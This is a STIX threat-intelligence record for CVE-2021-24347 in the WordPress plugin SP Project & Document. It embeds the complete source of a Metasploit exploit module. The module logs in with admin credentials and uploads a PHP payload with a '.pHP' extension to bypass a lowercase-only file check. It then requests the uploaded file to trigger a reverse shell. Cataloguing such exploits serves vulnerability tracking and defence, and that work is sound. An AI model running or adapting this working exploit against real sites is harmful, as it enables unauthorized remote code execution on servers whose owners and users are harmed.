{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--09204ab6-722a-4c46-85b9-f2bcc469240d",
    "created": "2024-08-14T17:10:28.324725Z",
    "modified": "2024-08-14T17:10:28.324729Z",
    "name": "Wordpress Plugin SP Project and Document - Authenticated Remote Code Execution",
    "description": " This module allows an attacker with a privileged Wordpress account to launch a reverse shell due to an arbitrary file upload vulnerability in Wordpress plugin SP Project & Document < 4.22. The security check only searches for lowercase file extensions such as `.php`, making it possible to upload `.pHP` files for instance. Finally, the uploaded payload can be triggered by a call to `/wp-content/uploads/sp-client-document-manager/<user_id>/<random_payload_name>.php`  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/wp_plugin_sp_project_document_rce.rb",
            "external_id": "wp_plugin_sp_project_document_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-24347"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Wordpress Plugin SP Project and Document - Authenticated Remote Code Execution',\n        'Description' => %q{\n          This module allows an attacker with a privileged Wordpress account to launch a reverse shell\n          due to an arbitrary file upload vulnerability in Wordpress plugin SP Project & Document < 4.22.\n          The security check only searches for lowercase file extensions such as `.php`, making it possible to upload `.pHP` files for instance.\n          Finally, the uploaded payload can be triggered by a call to `/wp-content/uploads/sp-client-document-manager/<user_id>/<random_payload_name>.php`\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Ron Jost', # Exploit-db\n          'Yann Castel (yann.castel[at]orange.com)' # Metasploit module\n        ],\n        'References' => [\n          ['EDB', '50115'],\n          ['CVE', '2021-24347']\n        ],\n        'Platform' => ['php'],\n        'Arch' => ARCH_PHP,\n        'Targets' => [\n          ['Wordpress SP Project & Document < 4.22', {}]\n        ],\n        'Privileged' => false,\n        'DisclosureDate' => '2021-06-14',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],\n          'Reliability' => [REPEATABLE_SESSION]\n        }\n      )\n    )\n\n    register_options [\n      OptString.new('USERNAME', [true, 'Username of the admin account', 'admin']),\n      OptString.new('PASSWORD', [true, 'Password of the admin account', 'admin']),\n      OptString.new('TARGETURI', [true, 'The base path of the Wordpress server', '/'])\n    ]\n  end\n\n  def check\n    return CheckCode::Unknown('Server not online or not detected as wordpress') unless wordpress_and_online?\n\n    cookie = wordpress_login(datastore['USERNAME'], datastore['PASSWORD'])\n    if cookie\n      check_plugin_version_from_readme('sp-client-document-manager', '4.22')\n    else\n      CheckCode::Detected('The admin credentials given are wrong !')\n    end\n  end\n\n  def get_user_id(cookie)\n    r = send_request_cgi({\n      'method' => 'GET',\n      'cookie' => cookie,\n      'uri' => normalize_uri(target_uri.path, 'wp-admin/admin.php'),\n      'Referer' => full_uri('/wp-admin/users.php'),\n      'vars_get' => {\n        'page' => 'sp-client-document-manager-fileview'\n      }\n    })\n    fail_with(Failure::Unknown, \"Target #{RHOST} could not be reached.\") unless r\n    user_id = r.body.to_s.match(%r{<option value='(\\d+)'>#{datastore['USERNAME']}</option>})\n    fail_with(Failure::UnexpectedReply, \"Can't find user id on plugin page\") unless user_id && user_id[1]\n    user_id[1]\n  end\n\n  def exploit\n    cookie = wordpress_login(datastore['USERNAME'], datastore['PASSWORD'])\n    fail_with(Failure::NoAccess, 'Authentication failed') unless cookie\n    user_id = get_user_id(cookie)\n    payload_name = \"#{Rex::Text.rand_text_alpha_lower(5)}.pHP\"\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(Rex::Text.rand_text_alpha(5..8), nil, nil, \"form-data; name='cdm_upload_file_field'\")\n    post_data.add_part(\"/wordpress/wp-admin/admin.php?page=sp-client-document-manager-fileview&id=#{user_id}\", nil, nil, \"form-data; name='_wp_http_referer'\")\n    post_data.add_part('exploits', nil, nil, \"form-data; name='dlg-upload-name'\")\n    post_data.add_part('', 'application/octet-stream', nil, \"form-data; name='dlg-upload-file[]'; filename=''\")\n    post_data.add_part(payload.encoded, 'application/x-php', nil, \"form-data; name='dlg-upload-file[]'; filename='#{payload_name}'\")\n    post_data.add_part('', nil, nil, \"form-data; name='dlg-upload-notes'\")\n    post_data.add_part('Upload', nil, nil, \"form-data; name='sp-cdm-community-upload'\")\n\n    print_status(\"Uploading file \\'#{payload_name}\\' containing the payload...\")\n\n    r = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'wp-admin/admin.php'),\n      'headers' => {\n        'Origin' => full_uri(''),\n        'Referer' => full_uri('wp-admin/admin.php')\n      },\n      'vars_get' => {\n        'page' => 'sp-client-document-manager-fileview',\n        'id' => user_id\n      },\n      'cookie' => cookie,\n      'data' => post_data.to_s,\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\"\n    )\n\n    fail_with(Failure::UnexpectedReply, \"Wasn't able to upload the payload file\") unless r&.code == 302\n    register_files_for_cleanup(payload_name.downcase)\n\n    print_status('Triggering the payload ...')\n\n    send_request_cgi(\n      'method' => 'GET',\n      'cookie' => cookie,\n      'uri' => normalize_uri(target_uri.path, \"/wp-content/uploads/sp-client-document-manager/#{user_id}/#{payload_name.downcase}\")\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-06-14",
    "x_mitre_platforms": [
        "['php']"
    ]
}